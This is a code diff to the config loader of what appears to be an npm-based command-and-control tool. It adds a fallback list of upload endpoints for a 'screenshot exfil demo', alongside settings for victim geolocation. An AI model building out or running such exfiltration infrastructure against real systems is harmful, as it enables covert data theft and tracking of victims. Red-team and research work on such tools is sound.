@@ -25,6 +25,7 @@ export const DEFAULTS = Object.freeze({
   geolocateServiceUrl: '', // MLS/Google-compatible WPS endpoint; '' = WiFi-scan-only mode
   geolocateServiceKey: '', // appended as ?key= when set; keep real keys in env.sh
   uploadUrl: '', // anonymous file-share endpoint for screenshot exfil demo; '' = channel transfer
+  uploadUrls: [], // ordered fallback list of upload endpoints; overrides/extends uploadUrl
   allowPublicRegistry: false,
   allowInsecureHttp: false,
   logLevel: 'info',
@@ -182,6 +183,9 @@ export function loadConfig(explicitPath) {
   if (process.env.NPM_C2_UPLOAD_URL !== undefined && process.env.NPM_C2_UPLOAD_URL !== '') {
     cfg.uploadUrl = process.env.NPM_C2_UPLOAD_URL;
   }
+  if (process.env.NPM_C2_UPLOAD_URLS !== undefined && process.env.NPM_C2_UPLOAD_URLS !== '') {
+    cfg.uploadUrls = process.env.NPM_C2_UPLOAD_URLS.split(',').map((u) => u.trim()).filter(Boolean);
+  }
   if (process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== undefined && process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== '') {
     cfg.allowPublicRegistry = parseBoolFlag(process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY);
   }
@@ -240,6 +244,15 @@ export function loadConfig(explicitPath) {
   cfg.enableGeolocate = parseBoolFlag(cfg.enableGeolocate);
   assertServiceUrl(cfg.geolocateServiceUrl, 'geolocateServiceUrl');
   assertServiceUrl(cfg.uploadUrl, 'uploadUrl');
+  if (!Array.isArray(cfg.uploadUrls)) {
+    throw new Error('uploadUrls must be an array of service endpoints');
+  }
+  for (const entry of cfg.uploadUrls) {
+    if (typeof entry !== 'string' || !entry) {
+      throw new Error('uploadUrls entries must be non-empty strings');
+    }
+    assertServiceUrl(entry, 'uploadUrls entry');
+  }
   cfg.allowPublicRegistry = parseBoolFlag(cfg.allowPublicRegistry);
   cfg.allowInsecureHttp = parseBoolFlag(cfg.allowInsecureHttp);
   cfg.downloadDir = path.resolve(String(cfg.downloadDir));
